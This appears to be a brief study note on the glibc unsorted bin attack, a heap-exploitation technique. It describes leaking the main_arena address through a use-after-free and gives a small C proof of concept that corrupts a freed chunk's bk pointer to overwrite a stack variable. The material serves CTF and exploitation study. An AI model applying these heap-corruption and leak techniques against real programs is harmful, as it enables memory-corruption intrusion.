# Unsorted_bin_attack

## Link main_arena

* malloc  chunk1，chunk2

* free chunk1 

* 通过UAF打印chunk1中FD的值，就是main_arena + 96 的地址。

* main_arena_offset 计算。libc2

  * ```c
    main_arena_offset = ELF("libc.so.6").symbols["__malloc_hook"] + 0x10
    ```

## Glibc 2.27 unsorted bin attack

```C
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
	volatile unsigned long stack_var=0;

	unsigned long *p=malloc(0x410);
	malloc(500);

	free(p);

	p[1]=(unsigned long)(&stack_var-2);

	malloc(0x410);

	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);

	assert(stack_var != 0);
}
```

